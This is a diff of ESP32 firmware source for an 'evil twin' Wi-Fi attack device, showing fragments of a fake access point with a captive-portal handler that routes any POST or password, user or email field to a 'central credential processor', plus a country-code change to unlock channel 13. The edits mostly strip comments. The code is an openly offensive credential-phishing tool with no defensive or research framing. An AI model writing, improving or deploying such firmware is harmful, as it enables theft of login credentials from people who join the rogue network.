@@ -3,7 +3,7 @@
 #include <WebServer.h>
 #include <DNSServer.h>
 #include <SPIFFS.h>
-#include <esp_wifi.h> // <--- ADDED: Required for changing country code
+#include <esp_wifi.h>
 
 // --- CONFIGURATION ---
 typedef struct {
@@ -38,7 +38,7 @@ unsigned long lastScan = 0;
 const unsigned long SCAN_INTERVAL = 15000;
 bool hotspotActive = false;
 
-// --- ADMIN UI HTML (UNCHANGED) ---
+// --- ADMIN UI HTML ---
 const char HEADER_TEMPLATE[] PROGMEM = R"raw(
 <!DOCTYPE html>
 <html lang="en">
@@ -157,7 +157,6 @@ void stopEvilTwin() {
 }
 
 // --- CENTRAL CREDENTIAL PROCESSOR ---
-// FIX: Now handles both GET and POST to ensure custom HTML works
 void processCaptivePortalLogin() {
   String ip = webServer.client().remoteIP().toString();
   String capturedData = "";
@@ -216,7 +215,7 @@ void handleAdmin() {
   html += FPSTR(FOOTER); webServer.send(200, "text/html", html);
 }
 
-// --- MAGIC HANDLER: The "Catch-All" Fix ---
+// --- MAGIC HANDLER: The "Catch-All" ---
 void handleCaptivePortal() {
   if (!hotspotActive) {
     webServer.sendHeader("Location", "/admin");
@@ -227,13 +226,13 @@ void handleCaptivePortal() {
   String host = webServer.hostHeader();
   String myIP = WiFi.softAPIP().toString();
 
-  // 1. IS THIS A LOGIN ATTEMPT?
+  // 1.THIS A LOGIN ATTEMPT
   if (webServer.method() == HTTP_POST || webServer.hasArg("password") || webServer.hasArg("user") || webServer.hasArg("email")) {
     processCaptivePortalLogin();
     return;
   }
 
-  // 2. IS THIS A CAPTIVE PORTAL CHECK? 
+  // 2.THIS A CAPTIVE PORTAL CHECK
   webServer.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
   webServer.sendHeader("Pragma", "no-cache");
   webServer.sendHeader("Expires", "-1");
@@ -284,7 +283,7 @@ void setup() {
   
   WiFi.mode(WIFI_AP_STA); 
   
-  // --- FIX FOR CHANNEL 13 (ADD THIS BLOCK) ---
+
   // Set country to China (CN) or Japan (JP) to enable channels 1-13
   wifi_country_t country = {
     .cc = "CN",
